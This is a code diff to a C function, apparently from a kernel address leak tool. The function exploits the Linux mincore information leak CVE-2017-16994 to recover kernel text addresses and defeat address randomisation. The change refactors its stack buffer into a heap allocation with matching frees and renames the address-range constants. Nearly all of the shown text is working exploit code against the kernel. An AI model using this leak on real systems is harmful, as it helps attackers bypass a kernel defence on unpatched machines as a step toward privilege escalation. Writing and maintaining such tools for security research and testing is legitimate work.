@@ -61,8 +61,14 @@ KASLD_META("method:heuristic\n"
            "cve:CVE-2017-16994\n"
            "patch:v4.15\n");
 
-unsigned long get_kernel_addr_mincore() {
-  unsigned char buf[getpagesize() / sizeof(unsigned char)];
+static unsigned long get_kernel_addr_mincore(void) {
+  /* Heap-allocate the page-sized cookie buffer: the runtime size from
+   * getpagesize() would otherwise require a VLA, which conflicts with
+   * -Wvla and pessimises -fstack-protector-strong on this frame. */
+  size_t page = (size_t)getpagesize();
+  unsigned char *buf = malloc(page);
+  if (!buf)
+    return 0;
   unsigned long iterations = 1000000;
   unsigned long addr = 0;
   unsigned long len = (unsigned long)0x20000000000;
@@ -72,6 +78,7 @@ unsigned long get_kernel_addr_mincore() {
            MAP_SHARED | MAP_ANONYMOUS | MAP_HUGETLB | MAP_NORESERVE, -1,
            0) == MAP_FAILED) {
     perror("[-] mmap");
+    free(buf);
     return 0;
   }
 
@@ -96,16 +103,18 @@ unsigned long get_kernel_addr_mincore() {
     /* Touch a mishandle with this type mapping */
     if (mincore((void *)0x86000000, 0x1000000, buf)) {
       perror("[-] mincore");
+      free(buf);
       return 0;
     }
 
     unsigned long n;
-    for (n = 0; n < (unsigned long)getpagesize() / sizeof(unsigned char); n++) {
+    for (n = 0; n < page / sizeof(unsigned char); n++) {
       addr = *(unsigned long *)(&buf[n]);
       /* Kernel address space */
-      if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX) {
+      if (addr >= KERNEL_TEXT_MIN && addr <= KERNEL_TEXT_MAX) {
         if (munmap((void *)0x66000000, len))
           perror("[-] munmap");
+        free(buf);
         return addr;
       }
     }
@@ -114,6 +123,7 @@ unsigned long get_kernel_addr_mincore() {
   if (munmap((void *)0x66000000, len))
     perror("[-] munmap");
 
+  free(buf);
   fprintf(stderr, "[-] kernel base not found in mincore info leak\n");
   return 0;
 }
